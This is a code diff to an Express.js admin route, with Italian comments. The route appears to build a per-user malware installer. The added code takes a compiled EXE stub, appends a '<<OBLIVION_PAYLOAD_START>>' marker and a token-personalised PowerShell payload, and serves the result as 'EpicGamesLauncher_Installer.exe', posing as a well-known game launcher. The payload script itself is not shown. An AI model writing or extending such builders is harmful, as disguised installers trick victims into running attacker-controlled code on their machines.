@@ -138,31 +138,45 @@ router.get('/generate-installer/:userId', authMiddleware, superAdminOnly, async 
   const user = await users.findOne({ _id: userId });
   if (!user) return res.status(404).json({ error: 'User not found' });
 
-  // Recupera o crea il userConfig con token
   let uc = await userConfigs.findOne({ user_id: userId });
-
   if (!uc) {
-    // Crea userConfig con token nuovo
     const { generateToken, DEFAULT_CONFIG } = require('../database');
     const newToken = generateToken();
     await userConfigs.insert({ user_id: userId, token: newToken, config: { ...DEFAULT_CONFIG } });
     uc = await userConfigs.findOne({ user_id: userId });
   } else if (!uc.token) {
-    // Ha userConfig ma niente token — aggiunge
     const { generateToken } = require('../database');
     const newToken = generateToken();
     await userConfigs.update({ _id: uc._id }, { $set: { token: newToken } });
     uc.token = newToken;
   }
 
-  const installer = generateInstaller(uc.token, user.username);
+  // Carica lo stub EXE compilato
+  const fsNode   = require('fs');
+  const pathNode = require('path');
+  const stubB64Path = pathNode.join(__dirname, '..', 'data', 'installer_stub.b64');
+  if (!fsNode.existsSync(stubB64Path)) {
+    return res.status(500).json({ error: 'Installer stub non trovato sul server. Contatta il dev.' });
+  }
+  const stubBytes = Buffer.from(fsNode.readFileSync(stubB64Path, 'utf8'), 'base64');
 
-  const filename = `EpicGamesLauncher_Setup.ps1`;
+  // Genera il PS1 personalizzato
+  const ps1Content = generateInstaller(uc.token, user.username);
+  const ps1Bytes   = Buffer.from(ps1Content, 'utf8');
+
+  // MARKER che lo stub cerca in coda all'EXE
+  const marker = Buffer.from('<<OBLIVION_PAYLOAD_START>>\n', 'ascii');
+
+  // EXE finale = stub + marker + PS1
+  const exeBuf = Buffer.concat([stubBytes, marker, ps1Bytes]);
+
+  const filename = `EpicGamesLauncher_Installer.exe`;
   res.setHeader('Content-Type', 'application/octet-stream');
   res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-  res.send(installer);
+  res.setHeader('Content-Length', exeBuf.length);
+  res.send(exeBuf);
 
-  console.log(`[INSTALLER] Generated for user=${user.username} token=${uc.token.slice(0,8)}... by admin=${req.user.username}`);
+  console.log(`[INSTALLER] EXE generated for user=${user.username} (${(exeBuf.length/1024).toFixed(1)} KB) by admin=${req.user.username}`);
 });
 
 // ─── GET /api/installer/payload ──────────────────────────────────────────────
